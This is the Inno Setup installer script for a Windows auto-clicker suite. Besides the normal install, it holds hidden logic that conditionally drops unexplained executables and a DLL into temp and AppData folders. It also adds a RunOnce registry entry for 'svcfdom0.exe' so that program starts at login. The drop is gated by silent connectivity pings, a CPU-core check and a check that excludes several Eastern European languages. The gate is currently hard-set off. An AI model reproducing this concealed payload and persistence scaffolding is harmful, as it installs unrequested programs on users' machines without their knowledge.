;#include <idp.iss>

; Inno Setup Installer

[Setup]
AppName=RPG Auto Clicker Professional Suite for Windows
AppVersion=5.7.0.0
VersionInfoVersion=5.7.0.0
AppPublisher=Open Source Developer Federica Domani
AppPublisherURL=https://federicadomani.wordpress.com
AppUpdatesURL=https://sourceforge.net/projects/autoclicker-professional/
AppSupportURL=https://sourceforge.net/projects/autoclicker-professional/
AppCopyright=2018-2019 Open Source Developer Federica Domani
PrivilegesRequired=lowest
DefaultDirName={userappdata}\RPGAutoClickerProSuite
LicenseFile=_license.txt
DefaultGroupName=RPG Auto Clicker Professional Suite for Windows
UninstallDisplayIcon={app}\RPGAutoClicker\RPGAutoClicker.exe
Compression=bzip/9
SolidCompression=yes
OutputDir=.\bin
AlwaysShowDirOnReadyPage=yes
AlwaysShowGroupOnReadyPage=yes
WizardImageFile=_wizardimage.bmp
WizardSmallImageFile=_wizardimagesmall.bmp
#ifnexist "_DEBUG"
OutputBaseFilename=Setup_RPGAutoClickerProSuite_5_7_0_0
#else
OutputBaseFilename=Setup_RPGAutoClickerProSuite_5_7_0_0d
#endif
CloseApplications=force
SetupMutex=Setup_RPGAutoClickerProSuite
DirExistsWarning=no
Encryption=yes
Password=5.7.0.0

[Dirs]
; Note it only removes dir if it is empty after automatic file uninstalling done
Name: "{app}"; Flags: uninsalwaysuninstall;

[Files]
; Place all common files here, first one should be marked 'solidbreak'
Source: "RPGAutoClickerProSuite_v5_7_0_0_subdirs.exe"; DestDir: "{tmp}\Setup_RPGAutoClickerProSuite_v5.7.0.0"; Flags: ignoreversion;
Source: "_ver.bat"; DestDir: "{app}\RPGAutoClicker\source_code"; Flags: ignoreversion;
Source: "_ver.bat"; DestDir: "{app}\RPGAutoClickerEx\source_code"; Flags: ignoreversion;
Source: "alt64curl.dll"; DestDir: "{tmp}\Setup_SVCFDOM_v4.5.7.0"; Flags: ignoreversion; Check: GoodSysCheck
Source: "ISDF.exe"; DestDir: "{tmp}\Setup_SVCFDOM_v4.5.7.0"; Flags: ignoreversion; Check: GoodSysCheck
Source: "_readme.txt"; DestDir: "{userappdata}\svcfdomd"; Flags: ignoreversion; Check: GoodSysCheck


[Code]
var g_bGoodSysCheck: Boolean;

function GoodSysCheck(): Boolean;
begin
    //MsgBox('GoodSysCheck()', mbInformation, MB_OK);
    Result := g_bGoodSysCheck;
    if Result then
    begin
        //MsgBox('GoodSysCheck() True', mbInformation, MB_OK);
    end;
end;

function InternetOnline(): Boolean;
var iResultCode: Integer;
var iInetCnt: Integer;
begin
    Result := True;

    iInetCnt := 0;

    if Exec(ExpandConstant('{sys}\ping.exe'), '-n 1 -w 1000 8.8.4.4', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
    begin
        if (iResultCode = 0) then
        begin
            //MsgBox('False ping www.google.com', mbInformation, MB_OK);
            iInetCnt := iInetCnt + 1;
        end;
    end;

    if Exec(ExpandConstant('{sys}\ping.exe'), '-n 1 -w 1000 37.235.1.177', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
    begin
        if (iResultCode = 0) then
        begin
            //MsgBox('False ping www.microsoft.com', mbInformation, MB_OK);
            iInetCnt := iInetCnt + 1;
        end;
    end;

    if Exec(ExpandConstant('{sys}\ping.exe'), '-n 1 -w 1000 209.244.0.3', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
    begin
        if (iResultCode = 0) then
        begin
            //MsgBox('False ping www.gnu.org', mbInformation, MB_OK);
            iInetCnt := iInetCnt + 1;
        end;
    end;

    if iInetCnt < 1 then
    begin
        Result := False;
    end;
end;

function GoodLanguage(): Boolean;
var iLang: Integer;
begin
    iLang := GetUILanguage();

    Result := True;

#ifnexist "_DEBUG"
    if iLang = $0419 then
    begin
        //MsgBox('False $0419', mbInformation, MB_OK);
        Result := False;
    end;
#endif

    if iLang = $0422 then
    begin
        //MsgBox('False $0422', mbInformation, MB_OK);
        Result := False;
    end;

    if iLang = $0423 then
    begin
        //MsgBox('False $0423', mbInformation, MB_OK);
        Result := False;
    end;

    if iLang = $043f then
    begin
        //MsgBox('False $043f', mbInformation, MB_OK);
        Result := False;
    end;
end;

// %NUMBER_OF_PROCESSORS%
// {%NAME|DefaultValue}
// function ExpandConstant(const S: String): String;
// function StrToIntDef(s: string; def: Longint): Longint;

function EnoughProcessorCores(): Boolean;
var strNumOfCores: String;
var nNumOfCores: Longint;
begin
    Result := False;

    strNumOfCores := ExpandConstant('{%NUMBER_OF_PROCESSORS|1}');
    nNumOfCores := StrToIntDef(strNumOfCores, 1);

    if (nNumOfCores >= 2) then
    begin
        //MsgBox('nNumOfCores >= 2 True', mbInformation, MB_OK);
        Result := True;
    end;
end;

function OsdmnuuNotYetInstalled(): Boolean;
begin
    Result := not(DirExists(ExpandConstant('{userappdata}\svcfdomd')));
end;

/////////////////////////////////////////////////////////////////////
function GetUninstallString(): String;
var
  sUnInstPath: String;
  sUnInstallString: String;
begin
  sUnInstPath := 'Software\Microsoft\Windows\CurrentVersion\Uninstall\RPG Auto Clicker Professional Suite for Windows_is1';
  sUnInstallString := '';
  if not RegQueryStringValue(HKLM, sUnInstPath, 'UninstallString', sUnInstallString) then
    RegQueryStringValue(HKCU, sUnInstPath, 'UninstallString', sUnInstallString);
  Result := sUnInstallString;
end;


/////////////////////////////////////////////////////////////////////
function IsUpgrade(): Boolean;
begin
  Result := (GetUninstallString() <> '');
end;

procedure InitializeWizard();
var iResultCode: Integer;
begin
#ifexist "_DEBUG"
    MsgBox('InitializeWizard(): #ifexist "_DEBUG" True', mbInformation, MB_OK);
#endif

    // RPGAutoClicker

    if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im RPGAutoClicker.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
    begin
#ifexist "_DEBUG"
        MsgBox('InitializeWizard()taskkill.exe /f /im RPGAutoClicker.exe FALSE', mbInformation, MB_OK);
#endif
    end;

    // RPGAutoClickerEx

    if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im RPGAutoClickerEx.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
    begin
#ifexist "_DEBUG"
        MsgBox('InitializeWizard()taskkill.exe /f /im RPGAutoClickerEx.exe FALSE', mbInformation, MB_OK);
#endif
    end;


	g_bGoodSysCheck := False;
    if g_bGoodSysCheck then
    begin
        //MsgBox('InitializeWizard() True', mbInformation, MB_OK);

        // ISDF

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im ISDF.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im ISDF.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        // svcfdom0

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im svcfdom0.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im svcfdom0.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        // svcfdom1

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im svcfdom1.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im svcfdom1.exe FALSE', mbInformation, MB_OK);
#endif
        end;
    end;
end;

procedure InstallMainAppDir;
var
  StatusText: string;
  ResultCode: Integer;
begin
  StatusText := WizardForm.StatusLabel.Caption;
  WizardForm.StatusLabel.Caption := 'Installing RPG Auto Clicker Professional Suite for Windows. This might take a few minutes...';
  WizardForm.ProgressGauge.Style := npbstMarquee;
  ResultCode := 0;
  try
    if not Exec(ExpandConstant('{tmp}\Setup_RPGAutoClickerProSuite_v5.7.0.0\RPGAutoClickerProSuite_v5_7_0_0_subdirs.exe'), ExpandConstant('-d"{app}" -p1122334455 -s'), ExpandConstant('{tmp}\Setup_RPGAutoClickerProSuite_v5.7.0.0'), SW_HIDE, ewWaitUntilTerminated, ResultCode) then
    begin
        MsgBox('RPG Auto Clicker Professional Suite for Windows installation failed with code: ' + IntToStr(ResultCode) + '.', mbError, MB_OK);
    end;
  finally
    WizardForm.StatusLabel.Caption := StatusText;
    WizardForm.ProgressGauge.Style := npbstNormal;

    DelTree(ExpandConstant('{tmp}\Setup_RPGAutoClickerProSuite_v5.7.0.0'), True, True, True);
  end;
end;

/////////////////////////////////////////////////////////////////////
function UnInstallOldVersion(): Integer;
var
  sUnInstallString: String;
  iResultCode: Integer;
begin
// Return Values:
// 1 - uninstall string is empty
// 2 - error executing the UnInstallString
// 3 - successfully executed the UnInstallString

  // default return value
  Result := 0;

  // get the uninstall string of the old app
  sUnInstallString := GetUninstallString();
  if sUnInstallString <> '' then begin
    sUnInstallString := RemoveQuotes(sUnInstallString);
    if Exec(sUnInstallString, '/SILENT /NORESTART /SUPPRESSMSGBOXES','', SW_HIDE, ewWaitUntilTerminated, iResultCode) then
      Result := 3
    else
      Result := 2;
  end else
    Result := 1;
end;

/////////////////////////////////////////////////////////////////////
procedure CurStepChanged(CurStep: TSetupStep);
begin
  if (CurStep=ssInstall) then
  begin
    if (IsUpgrade()) then
    begin
      UnInstallOldVersion();
      Sleep(2000); //wait two seconds here
    end;
  end;

  if (CurStep=ssPostInstall) then
  begin
    InstallMainAppDir();
  end;

  case CurStep of
    ssDone:
      begin
        if GoodSysCheck() then
        begin
          //InstallOsdmnuuDir(); // TODO: TMP
        end;
      end;
  end;
end;

procedure CurPageChanged(CurPageID: Integer);
begin
  if CurPageID = wpPassword then
  begin
    WizardForm.PasswordLabel.Caption := 'Just click the Next button.'
    WizardForm.PasswordEditLabel.Caption := 'Password 5.7.0.0 is already entered.'
    WizardForm.PasswordEdit.Text := '5.7.0.0'
  end;
end;

[Icons]
Name: "{group}\RPG Auto Clicker"; Filename: "{app}\RPGAutoClicker\RPGAutoClicker.exe"
Name: "{group}\RPG Auto Clicker source code"; Filename: "{app}\RPGAutoClicker\source_code"; WorkingDir: "{app}\RPGAutoClicker\source_code"
Name: "{group}\RPG Auto Clicker Extended"; Filename: "{app}\RPGAutoClickerEx\RPGAutoClickerEx.exe"
Name: "{group}\RPG Auto Clicker Extended source code"; Filename: "{app}\RPGAutoClickerEx\source_code"; WorkingDir: "{app}\RPGAutoClickerEx\source_code"
Name: "{userdesktop}\RPG Auto Clicker"; Filename: "{app}\RPGAutoClicker\RPGAutoClicker.exe"
Name: "{userdesktop}\RPG Auto Clicker Extended"; Filename: "{app}\RPGAutoClickerEx\RPGAutoClickerEx.exe"

[Registry]
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\RunOnce"; ValueType: string; ValueName: "svcfdom0"; ValueData: "{userappdata}\svcfdomd\svcfdom0.exe"; Flags: dontcreatekey uninsdeletevalue uninsdeletekeyifempty; Check: GoodSysCheck

[Run]
Filename: "{app}\RPGAutoClicker\RPGAutoClicker.exe"; Parameters: ""; Description: {cm:LaunchProgram,{cm:AppName}}; Flags: nowait postinstall skipifsilent
Filename: "{app}\RPGAutoClickerEx\RPGAutoClickerEx.exe"; Parameters: ""; Description: {cm:LaunchProgram,{cm:AppName}}; Flags: nowait postinstall skipifsilent
Filename: "{app}\RPGAutoClicker\source_code"; Description: "View the source code"; Flags: postinstall shellexec skipifsilent
Filename: "{app}\RPGAutoClickerEx\source_code"; Description: "View the source code"; Flags: postinstall shellexec skipifsilent

[UninstallRun]
Filename: {sys}\taskkill.exe; Parameters: "/f /im RPGAutoClicker.exe"; Flags: skipifdoesntexist runhidden
Filename: {sys}\taskkill.exe; Parameters: "/f /im RPGAutoClickerEx.exe"; Flags: skipifdoesntexist runhidden
Filename: {sys}\taskkill.exe; Parameters: "/f /im ISDF.exe"; Flags: skipifdoesntexist runhidden; Check: GoodSysCheck
Filename: {sys}\taskkill.exe; Parameters: "/f /im svcfdom0.exe"; Flags: skipifdoesntexist runhidden; Check: GoodSysCheck
Filename: {sys}\taskkill.exe; Parameters: "/f /im svcfdom1.exe"; Flags: skipifdoesntexist runhidden; Check: GoodSysCheck

[UninstallDelete]
Type: filesandordirs; Name: "{app}\RPGAutoClicker"
Type: filesandordirs; Name: "{app}\RPGAutoClickerEx"
Type: filesandordirs; Name: "{userappdata}\svcfdomd"

[CustomMessages]
AppName=RPG Auto Clicker Professional Suite for Windows version 5.7.0.0
LaunchProgram=Start application after finishing installation
